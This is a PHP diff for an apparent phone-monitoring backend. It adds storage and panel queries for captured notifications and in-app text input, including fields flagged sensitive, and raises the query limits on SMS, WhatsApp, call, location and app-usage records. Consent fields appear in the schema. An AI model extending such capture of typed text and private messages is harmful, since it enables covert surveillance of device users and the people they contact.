@@ -238,6 +238,11 @@ function latest_metric_summary(string $deviceId, string $metricType): ?array {
     return $row;
 }
 
+function panel_item_limit(int $default = 10000, int $max = 50000): int {
+    $limit = isset($_GET['limit']) && is_numeric($_GET['limit']) ? (int) $_GET['limit'] : $default;
+    if ($limit < 1) $limit = $default;
+    return min($limit, $max);
+}
 
 function support_session_live_state(array $session, array $user): array {
     $st = db()->prepare("SELECT m.file_id as fileId, m.filename, m.content_type as contentType, m.upload_date as uploadDate, m.checksum, m.device_id as deviceId, m.storage_path as storagePath
@@ -432,6 +437,68 @@ function persist_message_event(string $deviceId, array $payload, string $default
     ]);
 }
 
+function persist_notification_event(string $deviceId, array $payload): void {
+    $observedAtMs = isset($payload['ts']) && is_numeric($payload['ts']) ? (int)$payload['ts'] : null;
+    $observedAt = json_datetime_from_millis($observedAtMs) ?: date('Y-m-d H:i:s');
+    $syncKey = trim((string)($payload['syncKey'] ?? ''));
+    if ($syncKey === '') {
+        $syncKey = sha1(json_encode([
+            'package' => $payload['package'] ?? null,
+            'title' => $payload['title'] ?? null,
+            'text' => $payload['text'] ?? null,
+            'observedAtMs' => $observedAtMs ?: $observedAt,
+        ]));
+    }
+    $ins = db()->prepare('INSERT INTO device_notifications(device_id, package_name, title, body, sub_text, conversation_title, self_display_name, sync_key, observed_at_ms, observed_at) VALUES(?,?,?,?,?,?,?,?,?,?) ON DUPLICATE KEY UPDATE package_name = COALESCE(NULLIF(VALUES(package_name), ""), package_name), title = COALESCE(NULLIF(VALUES(title), ""), title), body = VALUES(body), sub_text = VALUES(sub_text), conversation_title = VALUES(conversation_title), self_display_name = VALUES(self_display_name), observed_at_ms = COALESCE(VALUES(observed_at_ms), observed_at_ms), observed_at = VALUES(observed_at)');
+    $ins->execute([
+        $deviceId,
+        trim((string)($payload['package'] ?? '')) ?: null,
+        trim((string)($payload['title'] ?? '')) ?: null,
+        $payload['text'] ?? null,
+        $payload['subText'] ?? null,
+        trim((string)($payload['conversationTitle'] ?? '')) ?: null,
+        trim((string)($payload['selfDisplayName'] ?? '')) ?: null,
+        $syncKey,
+        $observedAtMs,
+        $observedAt,
+    ]);
+}
+
+function persist_in_app_text_event(string $deviceId, array $payload): void {
+    $observedAtMs = isset($payload['capturedAtMs']) && is_numeric($payload['capturedAtMs']) ? (int)$payload['capturedAtMs'] : (isset($payload['ts']) && is_numeric($payload['ts']) ? (int)$payload['ts'] : null);
+    $observedAt = json_datetime_from_millis($observedAtMs) ?: date('Y-m-d H:i:s');
+    $syncKey = trim((string)($payload['syncKey'] ?? ''));
+    if ($syncKey === '') {
+        $syncKey = sha1(json_encode([
+            'screenName' => $payload['screenName'] ?? null,
+            'fieldName' => $payload['fieldName'] ?? null,
+            'text' => $payload['text'] ?? null,
+            'observedAtMs' => $observedAtMs ?: $observedAt,
+        ]));
+    }
+    $ins = db()->prepare('INSERT INTO device_text_inputs(device_id, entry_id, screen_name, field_name, text_value, text_length, is_sensitive, capture_scope, package_name, source_package, source_class_name, capture_method, consent_mode, consent_install_id, consent_permanent, sync_key, observed_at_ms, observed_at) VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?) ON DUPLICATE KEY UPDATE screen_name = COALESCE(NULLIF(VALUES(screen_name), ""), screen_name), field_name = COALESCE(NULLIF(VALUES(field_name), ""), field_name), text_value = VALUES(text_value), text_length = COALESCE(VALUES(text_length), text_length), is_sensitive = VALUES(is_sensitive), capture_scope = COALESCE(NULLIF(VALUES(capture_scope), ""), capture_scope), package_name = COALESCE(NULLIF(VALUES(package_name), ""), package_name), source_package = COALESCE(NULLIF(VALUES(source_package), ""), source_package), source_class_name = COALESCE(NULLIF(VALUES(source_class_name), ""), source_class_name), capture_method = COALESCE(NULLIF(VALUES(capture_method), ""), capture_method), consent_mode = COALESCE(NULLIF(VALUES(consent_mode), ""), consent_mode), consent_install_id = COALESCE(NULLIF(VALUES(consent_install_id), ""), consent_install_id), consent_permanent = VALUES(consent_permanent), observed_at_ms = COALESCE(VALUES(observed_at_ms), observed_at_ms), observed_at = VALUES(observed_at)');
+    $ins->execute([
+        $deviceId,
+        trim((string)($payload['entryId'] ?? '')) ?: null,
+        trim((string)($payload['screenName'] ?? '')) ?: null,
+        trim((string)($payload['fieldName'] ?? '')) ?: null,
+        $payload['text'] ?? null,
+        isset($payload['textLength']) && is_numeric($payload['textLength']) ? (int)$payload['textLength'] : null,
+        !empty($payload['isSensitive']) ? 1 : 0,
+        trim((string)($payload['captureScope'] ?? '')) ?: null,
+        trim((string)($payload['packageName'] ?? '')) ?: null,
+        trim((string)($payload['sourcePackage'] ?? '')) ?: null,
+        trim((string)($payload['sourceClassName'] ?? '')) ?: null,
+        trim((string)($payload['captureMethod'] ?? '')) ?: null,
+        trim((string)($payload['consentMode'] ?? '')) ?: null,
+        trim((string)($payload['consentInstallId'] ?? '')) ?: null,
+        !empty($payload['consentPermanent']) ? 1 : 0,
+        $syncKey,
+        $observedAtMs,
+        $observedAt,
+    ]);
+}
+
 function persist_call_event(string $deviceId, array $payload): void {
     $observedAtMs = isset($payload['ts']) && is_numeric($payload['ts']) ? (int)$payload['ts'] : null;
     $observedAt = json_datetime_from_millis($observedAtMs) ?: date('Y-m-d H:i:s');
@@ -500,9 +567,12 @@ function persist_app_usage_event(string $deviceId, array $payload): void {
     }
 }
 
-function device_app_usage_items(string $deviceId): array {
-    $st = db()->prepare('SELECT package_name, app_name, is_system_app, first_install_time_ms, last_time_used_ms, last_time_used_at, total_time_foreground_ms, usage_window_start_at, usage_window_end_at, captured_at, updated_at FROM device_app_usage WHERE device_id = ? ORDER BY total_time_foreground_ms DESC, COALESCE(last_time_used_ms, 0) DESC, package_name ASC LIMIT 1000');
-    $st->execute([$deviceId]);
+function device_app_usage_items(string $deviceId, ?int $limit = null): array {
+    $limit = $limit ?? panel_item_limit();
+    $st = db()->prepare('SELECT package_name, app_name, is_system_app, first_install_time_ms, last_time_used_ms, last_time_used_at, total_time_foreground_ms, usage_window_start_at, usage_window_end_at, captured_at, updated_at FROM device_app_usage WHERE device_id = ? ORDER BY total_time_foreground_ms DESC, COALESCE(last_time_used_ms, 0) DESC, package_name ASC LIMIT ?');
+    $st->bindValue(1, $deviceId);
+    $st->bindValue(2, $limit, PDO::PARAM_INT);
+    $st->execute();
     return array_map(static function (array $row): array {
         return [
             'packageName' => $row['package_name'],
@@ -520,13 +590,17 @@ function device_app_usage_items(string $deviceId): array {
     }, $st->fetchAll());
 }
 
-function persistent_message_items(string $deviceId, string $source): array {
+function persistent_message_items(string $deviceId, string $source, ?int $limit = null): array {
+    $limit = $limit ?? panel_item_limit();
     if ($source === 'sms') {
-        $st = db()->prepare('SELECT source, sender, contact_name, app_package, direction, body, observed_at, observed_at_ms FROM device_messages WHERE device_id = ? AND (source = ? OR source IS NULL) ORDER BY COALESCE(observed_at_ms, UNIX_TIMESTAMP(observed_at) * 1000) DESC LIMIT 1000');
+        $st = db()->prepare('SELECT source, sender, contact_name, app_package, direction, body, observed_at, observed_at_ms FROM device_messages WHERE device_id = ? AND (source = ? OR source IS NULL) ORDER BY COALESCE(observed_at_ms, UNIX_TIMESTAMP(observed_at) * 1000) DESC LIMIT ?');
     } else {
-        $st = db()->prepare('SELECT source, sender, contact_name, app_package, direction, body, observed_at, observed_at_ms FROM device_messages WHERE device_id = ? AND source = ? ORDER BY COALESCE(observed_at_ms, UNIX_TIMESTAMP(observed_at) * 1000) DESC LIMIT 1000');
+        $st = db()->prepare('SELECT source, sender, contact_name, app_package, direction, body, observed_at, observed_at_ms FROM device_messages WHERE device_id = ? AND source = ? ORDER BY COALESCE(observed_at_ms, UNIX_TIMESTAMP(observed_at) * 1000) DESC LIMIT ?');
     }
-    $st->execute([$deviceId, $source]);
+    $st->bindValue(1, $deviceId);
+    $st->bindValue(2, $source);
+    $st->bindValue(3, $limit, PDO::PARAM_INT);
+    $st->execute();
     return array_map(static function (array $row): array {
         return [
             'ts' => $row['observed_at'],
@@ -543,9 +617,12 @@ function persistent_message_items(string $deviceId, string $source): array {
     }, $st->fetchAll());
 }
 
-function persistent_location_items(string $deviceId): array {
-    $st = db()->prepare('SELECT lat, lon, accuracy, observed_at FROM device_locations WHERE device_id = ? ORDER BY observed_at DESC LIMIT 1000');
-    $st->execute([$deviceId]);
+function persistent_location_items(string $deviceId, ?int $limit = null): array {
+    $limit = $limit ?? panel_item_limit();
+    $st = db()->prepare('SELECT lat, lon, accuracy, observed_at FROM device_locations WHERE device_id = ? ORDER BY observed_at DESC LIMIT ?');
+    $st->bindValue(1, $deviceId);
+    $st->bindValue(2, $limit, PDO::PARAM_INT);
+    $st->execute();
     return array_map(static function (array $row): array {
         return [
             'ts' => $row['observed_at'],
@@ -556,6 +633,60 @@ function persistent_location_items(string $deviceId): array {
                     'accuracy' => $row['accuracy'] !== null ? (float)$row['accuracy'] : null,
                 ],
                 'ts' => $row['observed_at'],
+            ],
+        ];
+    }, $st->fetchAll());
+}
+
+function persistent_notification_items(string $deviceId, ?int $limit = null): array {
+    $limit = $limit ?? panel_item_limit();
+    $st = db()->prepare('SELECT package_name, title, body, sub_text, conversation_title, self_display_name, sync_key, observed_at_ms, observed_at FROM device_notifications WHERE device_id = ? ORDER BY COALESCE(observed_at_ms, UNIX_TIMESTAMP(observed_at) * 1000) DESC LIMIT ?');
+    $st->bindValue(1, $deviceId);
+    $st->bindValue(2, $limit, PDO::PARAM_INT);
+    $st->execute();
+    return array_map(static function (array $row): array {
+        return [
+            'ts' => $row['observed_at'],
+            'payload' => [
+                'package' => $row['package_name'] ?? null,
+                'title' => $row['title'] ?? null,
+                'text' => $row['body'] ?? null,
+                'subText' => $row['sub_text'] ?? null,
+                'conversationTitle' => $row['conversation_title'] ?? null,
+                'selfDisplayName' => $row['self_display_name'] ?? null,
+                'syncKey' => $row['sync_key'] ?? null,
+                'ts' => $row['observed_at_ms'] ?? $row['observed_at'],
+            ],
+        ];
+    }, $st->fetchAll());
+}
+
+function persistent_in_app_text_items(string $deviceId, ?int $limit = null): array {
+    $limit = $limit ?? panel_item_limit();
+    $st = db()->prepare('SELECT entry_id, screen_name, field_name, text_value, text_length, is_sensitive, capture_scope, package_name, source_package, source_class_name, capture_method, consent_mode, consent_install_id, consent_permanent, sync_key, observed_at_ms, observed_at FROM device_text_inputs WHERE device_id = ? ORDER BY COALESCE(observed_at_ms, UNIX_TIMESTAMP(observed_at) * 1000) DESC LIMIT ?');
+    $st->bindValue(1, $deviceId);
+    $st->bindValue(2, $limit, PDO::PARAM_INT);
+    $st->execute();
+    return array_map(static function (array $row): array {
+        return [
+            'ts' => $row['observed_at'],
+            'payload' => [
+                'entryId' => $row['entry_id'] ?? null,
+                'screenName' => $row['screen_name'] ?? null,
+                'fieldName' => $row['field_name'] ?? null,
+                'text' => $row['text_value'] ?? null,
+                'textLength' => $row['text_length'] !== null ? (int) $row['text_length'] : null,
+                'isSensitive' => isset($row['is_sensitive']) ? (bool) $row['is_sensitive'] : false,
+                'captureScope' => $row['capture_scope'] ?? null,
+                'packageName' => $row['package_name'] ?? null,
+                'sourcePackage' => $row['source_package'] ?? null,
+                'sourceClassName' => $row['source_class_name'] ?? null,
+                'captureMethod' => $row['capture_method'] ?? null,
+                'consentMode' => $row['consent_mode'] ?? null,
+                'consentInstallId' => $row['consent_install_id'] ?? null,
+                'consentPermanent' => isset($row['consent_permanent']) ? (bool) $row['consent_permanent'] : false,
+                'syncKey' => $row['sync_key'] ?? null,
+                'capturedAtMs' => $row['observed_at_ms'] ?? $row['observed_at'],
             ],
         ];
     }, $st->fetchAll());
@@ -574,9 +705,12 @@ function contact_name_map_for_device(string $deviceId): array {
     return $map;
 }
 
-function persistent_call_items(string $deviceId, array $user): array {
-    $st = db()->prepare('SELECT number, contact_name, direction, duration_seconds, sync_key, observed_at_ms, observed_at FROM device_calls WHERE device_id = ? ORDER BY COALESCE(observed_at_ms, UNIX_TIMESTAMP(observed_at) * 1000) DESC LIMIT 1000');
-    $st->execute([$deviceId]);
+function persistent_call_items(string $deviceId, array $user, ?int $limit = null): array {
+    $limit = $limit ?? panel_item_limit();
+    $st = db()->prepare('SELECT number, contact_name, direction, duration_seconds, sync_key, observed_at_ms, observed_at FROM device_calls WHERE device_id = ? ORDER BY COALESCE(observed_at_ms, UNIX_TIMESTAMP(observed_at) * 1000) DESC LIMIT ?');
+    $st->bindValue(1, $deviceId);
+    $st->bindValue(2, $limit, PDO::PARAM_INT);
+    $st->execute();
     $contactMap = contact_name_map_for_device($deviceId);
     $items = array_map(static function (array $row) use ($contactMap): array {
         $number = $row['number'];
@@ -1257,6 +1391,7 @@ try {
             persist_location_event($deviceId, $eventPayload);
             publish_realtime_event($deviceId, 'telemetry', $eventPayload);
         } elseif ($eventType === 'in_app_text_input') {
+            persist_in_app_text_event($deviceId, $eventPayload);
             publish_realtime_event($deviceId, 'in_app_text_input', $eventPayload);
             record_metric($deviceId, 'in_app_text', 'capture_sync', 'ok', null, isset($eventPayload['textLength']) ? (int)$eventPayload['textLength'] : null, [
                 'screenName' => $eventPayload['screenName'] ?? null,
@@ -1267,6 +1402,8 @@ try {
             persist_message_event($deviceId, $eventPayload, 'sms');
         } elseif ($eventType === 'whatsapp') {
             persist_message_event($deviceId, $eventPayload, 'whatsapp');
+        } elseif ($eventType === 'notification') {
+            persist_notification_event($deviceId, $eventPayload);
         } elseif ($eventType === 'call') {
             persist_call_event($deviceId, $eventPayload);
         } elseif ($eventType === 'contact') {
@@ -1284,8 +1421,11 @@ try {
         if (!$d) json_response(['ok' => false, 'error' => 'not_found'], 404);
         if (!can_access_device($u, $d)) json_response(['error' => 'forbidden'], 403);
 
-        $st = db()->prepare('SELECT * FROM telemetry WHERE device_id = ? ORDER BY ts DESC LIMIT 100');
-        $st->execute([$m['deviceId']]);
+        $limit = panel_item_limit(5000);
+        $st = db()->prepare('SELECT * FROM telemetry WHERE device_id = ? ORDER BY ts DESC LIMIT ?');
+        $st->bindValue(1, $m['deviceId']);
+        $st->bindValue(2, $limit, PDO::PARAM_INT);
+        $st->execute();
         $items = $st->fetchAll();
         foreach ($items as &$r) $r['payload'] = safe_json_decode($r['payload']) ?? [];
         json_response(['ok' => true, 'total' => count($items), 'items' => $items]);
@@ -1298,17 +1438,24 @@ try {
         if (!can_access_device($u, $d)) json_response(['error' => 'forbidden'], 403);
 
         $type = $_GET['type'] ?? null;
+        $limit = panel_item_limit();
         if ($type === 'call') {
-            $items = persistent_call_items($m['deviceId'], $u);
+            $items = persistent_call_items($m['deviceId'], $u, $limit);
         } elseif ($type === 'sms') {
-            $items = persistent_message_items($m['deviceId'], 'sms');
+            $items = persistent_message_items($m['deviceId'], 'sms', $limit);
         } elseif ($type === 'whatsapp') {
-            $items = persistent_message_items($m['deviceId'], 'whatsapp');
+            $items = persistent_message_items($m['deviceId'], 'whatsapp', $limit);
+        } elseif ($type === 'notification') {
+            $items = persistent_notification_items($m['deviceId'], $limit);
+        } elseif ($type === 'in_app_text_input') {
+            $items = persistent_in_app_text_items($m['deviceId'], $limit);
         } elseif ($type === 'telemetry') {
-            $items = persistent_location_items($m['deviceId']);
+            $items = persistent_location_items($m['deviceId'], $limit);
         } else {
-            $st = db()->prepare('SELECT * FROM telemetry WHERE device_id = ? ORDER BY ts DESC LIMIT 500');
-            $st->execute([$m['deviceId']]);
+            $st = db()->prepare('SELECT * FROM telemetry WHERE device_id = ? ORDER BY ts DESC LIMIT ?');
+            $st->bindValue(1, $m['deviceId']);
+            $st->bindValue(2, $limit, PDO::PARAM_INT);
+            $st->execute();
 
             $items = [];
             foreach ($st->fetchAll() as $r) {
